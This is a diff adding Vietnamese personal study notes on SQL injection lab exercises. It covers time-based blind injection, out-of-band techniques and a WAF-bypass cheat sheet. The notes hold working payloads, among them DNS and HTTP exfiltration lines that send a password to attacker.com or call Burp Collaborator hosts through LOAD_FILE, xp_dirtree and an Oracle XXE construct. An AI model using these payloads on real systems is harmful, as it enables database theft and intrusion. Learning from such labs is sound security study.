@@ -210,7 +210,131 @@ hmmm lab khoai vcl, không biết viết query thì toang thật , cơ bản nó
 một cái nữa là độ dài, có thể xóa đi mã tracking id vì vế sau đúng r thì có cần check vế trước đâu => đủ khoảng cách cho lệnh khai thác của mình
 
 -Exploiting blind SQL injection by triggering time delays 
+LAB , coi solution, cũng bth, burp xịn thì ez kẹp 2 payload + clusbomb attack, cùi thì 1 payload r dò, cũng ok nhưng chậm hơn.
+
 
 '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 
 
+-Exploiting blind SQL injection using out-of-band (OAST) techniques
+Bạn mô tả đúng một tình huống khá khó chịu trong khai thác SQLi:
+Ứng dụng thực hiện truy vấn bất đồng bộ (asynchronous).
+Kết quả, lỗi hay thời gian chạy của query không ảnh hưởng đến phản hồi trả về cho người dùng.
+Các kỹ thuật SQLi kinh điển như error-based, union-based hay time-based blind đều bị vô hiệu.
+👉 Trong trường hợp này, kẻ tấn công thường phải dùng đến out-of-band SQL injection (OOB SQLi).
+
+🔹 Out-of-Band SQL Injection (OOB SQLi)
+Thay vì cố gắng đọc kết quả từ phản hồi HTTP, bạn buộc cơ sở dữ liệu tự gửi dữ liệu ra ngoài, đến một hệ thống bạn kiểm soát (máy chủ attacker).
+Các kênh hay dùng: HTTP requests, SMB, nhưng DNS thường hiệu quả nhất.
+Ví dụ:
+Bạn chèn payload khiến DBMS thực hiện một tra cứu DNS chứa dữ liệu cần leak.
+Truy vấn DNS này sẽ đi qua hệ thống, và đến DNS server bạn kiểm soát.
+Bạn quan sát domain được query để biết dữ liệu.
+🔹 Tại sao DNS hiệu quả?
+DNS gần như luôn được phép thoát ra ngoài vì hệ thống nào cũng cần phân giải tên miền.
+Khác với HTTP/SMB có thể bị chặn tường lửa, DNS “trông hợp pháp”.
+Dữ liệu có thể encode trong subdomain, ví dụ:
+SELECT ... FROM users WHERE id=1 AND 
+(SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE id=1),'.attacker.com\\abc')))
+hoặc với xp_dirtree, UTL_INADDR, DBMS_LDAP, fn_gettingdns(...) tùy DBMS.
+🔹 Tóm gọn
+Ứng dụng async không leak thông tin qua response → chuyển sang OOB SQLi.
+DNS exfiltration là kỹ thuật phổ biến nhất.
+Bạn sẽ cần:
+Máy chủ attacker (DNS server log lại query).
+Payload SQL đặc thù cho DBMS (MySQL, MSSQL, Oracle, PostgreSQL…).
+
+'|| (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cgwiHkkm49dt3sgk9Lufyb6mxsgnc.burpcollaborator.net/"> %remote;]>'),
+'/l') FROM dual)--
+Các kỹ thuật kích hoạt truy vấn DNS tùy thuộc vào loại cơ sở dữ liệu đang sử dụng. Ví dụ: có thể sử dụng lệnh sau trên Microsoft SQL Server để thực hiện tra cứu DNS trên một tên miền cụ thể:
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+
+
+LAB TrackingId=x'||SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<your-collaborator-id>.oastify.com/"> %remote;]>'),'/l') FROM dual-- -; session=FLNkcWEABxNlMSPasQmgwuqdj45bumXm
+
+lab này yêu cầu có burp xịn =)))
+
+SQL injection in different contexts
+🛡️ SQLi WAF Bypass Cheat Sheet
+1. Case variation (chữ hoa/thường xen kẽ)
+select → SeLeCt → SELEct
+union  → UnIoN
+
+2. Inline comment injection
+SELECT/*foo*/password/*bar*/FROM/*baz*/users
+UNION/**/SELECT/**/NULL,NULL
+
+3. SQL comment để tách từ khóa
+SEL/**/ECT
+UN/**/ION
+
+4. URL encoding
+
+Encode từng ký tự hoặc toàn bộ chuỗi:
+
+' OR 1=1--
+
+
+→ URL encoded:
+
+%27%20OR%201%3D1--
+
+5. Unicode / Hex encoding
+
+Dùng CHAR() hoặc 0x để biểu diễn chuỗi:
+
+SELECT CHAR(83,69,76,69,67,84)
+SELECT 0x73656c656374
+
+
+→ cả hai đều trả về "SELECT".
+
+6. XML entity encoding
+
+Dùng &#xNN; (hex) hoặc &#NN; (decimal):
+
+&#x53;ELECT * FROM users
+&#83;ELECT * FROM users
+
+
+(&#x53; = S, &#83; = S)
+
+7. String concatenation
+SEL' || 'ECT
+CONCAT('SE','LECT')
+
+8. Inline arithmetic / boolean tricks
+1=1+0
+1 LIKE 1
+2 BETWEEN 2 AND 2
+
+9. Alternative keywords
+
+Một số DB có alias từ khóa:
+
+|| thay cho CONCAT() trong Oracle.
+
+&& thay cho AND trong MySQL.
+
+10. Time-based evasion (nếu WAF block boolean)
+SLEEP(5)
+BENCHMARK(5000000,MD5(1))
+PG_SLEEP(5)
+DBMS_PIPE.RECEIVE_MESSAGE('a',5)
+
+
+✅ Cách dùng:
+
+Khi WAF block từ khóa → thử encode bằng XML entity, URL, Unicode.
+
+Khi WAF block pattern query → comment tách từ khóa.
+
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+
+Khi WAF block logic đơn giản (OR 1=1) → dùng concatenation hoặc arithmetic trick.
+
+-Second-order SQL injection
